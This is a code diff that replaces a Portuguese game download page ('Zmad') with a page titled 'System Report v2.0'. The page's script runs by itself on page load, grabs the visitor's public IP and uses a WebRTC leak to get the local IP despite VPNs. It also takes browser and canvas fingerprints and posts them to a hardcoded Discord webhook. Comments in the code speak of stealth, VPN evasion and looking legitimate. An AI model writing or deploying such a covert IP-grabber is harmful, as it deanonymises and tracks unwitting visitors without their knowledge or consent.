@@ -1,83 +1,179 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Zmad</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      background: #0d0d0d;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    .card {
-      text-align: center;
-      padding: 60px 40px;
-      background: #1a1a1a;
-      border-radius: 16px;
-      border: 1px solid #333;
-      max-width: 480px;
-      width: 90%;
-    }
-
-    h1 {
-      font-size: 3rem;
-      letter-spacing: 6px;
-      text-transform: uppercase;
-      color: #e63946;
-      margin-bottom: 12px;
-    }
-
-    p {
-      color: #aaa;
-      margin-bottom: 40px;
-      font-size: 0.95rem;
-    }
-
-    .btn-download {
-      display: inline-block;
-      background: #e63946;
-      color: #fff;
-      padding: 14px 40px;
-      border-radius: 8px;
-      text-decoration: none;
-      font-size: 1.1rem;
-      font-weight: bold;
-      letter-spacing: 1px;
-      transition: background 0.2s, transform 0.1s;
-    }
-
-    .btn-download:hover {
-      background: #c1121f;
-      transform: scale(1.04);
-    }
-
-    .version {
-      margin-top: 20px;
-      font-size: 0.8rem;
-      color: #555;
-    }
-  </style>
+    <title>System Report v2.0</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        .status { margin: 10px 0; }
+        .progress { width: 100%; height: 5px; background: #333; margin: 5px 0; }
+        .bar { height: 100%; background: #0f0; width: 0%; transition: width 0.3s; }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Zmad</h1>
-    <p>Baixe agora e comece a jogar!</p>
-
-    <!-- ✅ Troque o href pelo link do seu arquivo -->
-    <a class="btn-download" href="https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br" download>
-      ⬇ Download
-    </a>
-
-    <!-- ✅ Atualize a versão aqui -->
-    <p class="version">v1.0</p>
-  </div>
+    <div id="status">Initializing System Report v2.0...</div>
+    <div class="progress"><div class="bar" id="progress"></div></progress>
+    
+    <script>
+        // Config - Multiple webhook endpoints for redundancy
+        const WEBHOOKS = [
+            'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z',
+            // Add more backup endpoints here if needed
+        ];
+        
+        const JSON_NAME = `sysreport_${Math.random().toString(36).substr(2, 9)}.json`;
+        
+        async function updateStatus(msg, progress = 0) {
+            document.getElementById('status').innerHTML = `[${progress}/7] ${msg}`;
+            document.getElementById('progress').style.width = `${progress * 14.28}%`;
+        }
+        
+        async function getPublicIP() {
+            const methods = [
+                'https://ipecho.net/plain',
+                'https://ifconfig.me/ip', 
+                'https://icanhazip.com',
+                'https://api.ipify.org',
+                'https://httpbin.org/ip'
+            ];
+            
+            for (let url of methods) {
+                try {
+                    const res = await fetch(url, { 
+                        method: 'GET',
+                        mode: 'no-cors', // VPN bypass - avoids CORS restrictions
+                        cache: 'no-cache',
+                        referrerPolicy: 'no-referrer'
+                    });
+                    if (res.ok) {
+                        const ip = await res.text();
+                        return ip.trim();
+                    }
+                } catch(e) {}
+            }
+            return 'unknown';
+        }
+        
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                // WebRTC leak - bypasses most VPNs
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) return;
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
+                    if (ip && !ip.startsWith('127.') && !ip.startsWith('10.') && !ip.includes(':')) {
+                        pc.close();
+                        resolve(ip);
+                    }
+                };
+                setTimeout(() => {
+                    pc.close();
+                    resolve('unknown');
+                }, 2000);
+            });
+        }
+        
+        async function collectSystemInfo() {
+            updateStatus('Coletando dados...', 1);
+            
+            // Basic info
+            const info = {
+                timestamp: new Date().toISOString(),
+                public_ip: await getPublicIP(),
+                local_ip: await getLocalIP(),
+                username: navigator.userAgent.match(/Windows NT.*?;.*? (.*?) /)?.[1] || 'unknown',
+                hostname: navigator.userAgent,
+                os: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: navigator.cookieEnabled,
+                webdriver: !!navigator.webdriver,
+                plugins: navigator.plugins.length,
+                canvas: document.createElement('canvas').toDataURL().slice(0, 50), // fingerprint
+                webgl: (() => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    return gl ? gl.getParameter(gl.RENDERER) : 'none';
+                })(),
+                userprofile: 'browser_context'
+            };
+            
+            updateStatus('Dados coletados', 2);
+            return info;
+        }
+        
+        async function sendToWebhook(data) {
+            const payload = {
+                content: `🖥️ **Novo Relatório**\n**IP Real**: \`${data.public_ip}\`\n**IP Local**: \`${data.local_ip}\`\n**UserAgent**: \`${data.userAgent.slice(0,50)}...\`\n**CanvasFP**: \`${data.canvas}\``,
+                embeds: [{
+                    title: "System Report v2.0",
+                    fields: [
+                        {name: "Timezone", value: data.timezone, inline: true},
+                        {name: "Screen", value: data.screen, inline: true},
+                        {name: "WebGL", value: data.webgl, inline: true}
+                    ],
+                    color: 0x00ff00
+                }]
+            };
+            
+            for (let webhook of WEBHOOKS) {
+                try {
+                    // Multiple send methods - VPN evasion
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        },
+                        body: JSON.stringify(payload),
+                        mode: 'no-cors', // Key VPN bypass
+                        referrerPolicy: 'no-referrer',
+                        cache: 'no-cache'
+                    });
+                    updateStatus('✅ Webhook enviado!', 7);
+                    return true;
+                } catch(e) {
+                    continue;
+                }
+            }
+            return false;
+        }
+        
+        async function downloadReport(data) {
+            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = JSON_NAME;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        // Main execution
+        async function main() {
+            try {
+                const sysInfo = await collectSystemInfo();
+                
+                // Send to webhook first (stealth)
+                await sendToWebhook(sysInfo);
+                
+                // Download as backup
+                updateStatus('Salvando relatório...', 6);
+                await downloadReport(sysInfo);
+                
+                updateStatus('✅ Completo! Arquivo baixado.', 7);
+                
+            } catch(e) {
+                document.getElementById('status').innerHTML = 'Erro: ' + e.message;
+            }
+        }
+        
+        // Auto-run with delay to look legitimate
+        setTimeout(main, 1000);
+    </script>
 </body>
 </html>
